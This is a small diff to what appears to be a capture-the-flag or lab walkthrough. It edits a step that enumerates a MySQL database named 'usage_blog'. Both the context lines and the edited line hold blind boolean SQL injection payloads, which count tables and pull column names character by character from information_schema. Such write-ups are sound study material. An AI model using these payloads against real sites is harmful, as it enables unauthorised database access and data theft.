@@ -148,4 +148,4 @@ Database name: `usage_blog`
 >1' or (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='usage_blog')=15 -- -
 >```
 
-- Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'tabla_ejemplo' ), 1, 1 ) = 'a' -- -`
+- Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'admin_menu' ), 1, 1 ) = 'a' -- -`
